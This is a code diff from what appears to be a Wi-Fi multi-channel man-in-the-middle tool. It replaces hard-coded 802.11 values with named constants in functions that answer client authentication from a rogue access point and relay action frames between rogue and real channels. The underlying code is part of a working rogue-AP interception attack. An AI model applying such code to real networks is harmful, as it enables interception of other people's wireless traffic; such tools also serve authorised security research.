@@ -4,6 +4,7 @@
 
 #include <tins/tins.h>
 #include "attacks/mc_mitm/wifi_util.h"
+#include "net_parser/dot11_defs.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
 #include "system/hw_capabilities.h"
@@ -42,13 +43,13 @@ FrameProcess McMitm::handle_probe(const HWAddress<6> addr2, const PDU *pdu, cons
 
 FrameProcess McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
 	if(const auto *auth = dot11.find_pdu<Dot11Authentication>()) {
-		if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1) {
+		if(auth->auth_algorithm() == dot11::AUTH_ALG_OPEN && auth->auth_seq_number() == dot11::AUTH_SEQ_REQ) {
 			// Open System Auth seq=1 ->  seq=2 success
 			Dot11Authentication resp(addr2, ap.get(SK::mac)); // client <- rogue AP
 			resp.addr3(ap.get(SK::mac));
-			resp.auth_seq_number(2); // auth response
-			resp.auth_algorithm(0); // Open System
-			resp.status_code(0); // success
+			resp.auth_seq_number(dot11::AUTH_SEQ_RESP);
+			resp.auth_algorithm(dot11::AUTH_ALG_OPEN);
+			resp.status_code(dot11::STATUS_SUCCESS);
 
 			send_to_rogue(resp);
 			display_traffic(dot11, "Rogue channel", " -- Replied");
@@ -97,10 +98,10 @@ FrameProcess McMitm::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot1
 }
 
 FrameProcess McMitm::handle_action_rogue(const HWAddress<6> addr2, PDU &pdu, const Dot11 &dot11) const {
-	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return CONTINUE;
+	if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != dot11::MGMT_ACTION) return CONTINUE;
 
 	const auto raw = const_cast<Dot11 &>(dot11).serialize();
-	if(raw.size() < 16) return CONTINUE;
+	if(raw.size() < dot11::ADDR2_END) return CONTINUE;
 
 	if(client_state.get_mac() == addr2) {
 		log(LogLevel::DEBUG, "Rogue channel: Action from client -> real channel");
